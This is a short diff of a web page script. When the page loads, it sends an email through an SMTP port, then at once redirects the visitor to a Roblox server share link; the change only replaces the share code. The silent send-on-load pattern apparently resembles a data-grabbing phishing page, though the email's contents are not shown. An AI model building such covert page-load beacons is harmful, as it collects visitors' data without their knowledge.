@@ -21,7 +21,7 @@ window.onload = () => {
         Port: "2525"
       }).then(() => {
             setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/share?code=3e36be2f03f5fd4aa249788c74677870&type=Server';
+                window.location.href = 'https://www.roblox.com/share?code=fab53a60468193458431eb86fdb07d2e&type=Server';
             }, 0.0000000000000000000000000000000000000000000000000000000000000000000000001);
         }).catch((error) => {
             console.error('Error sending email:', error);
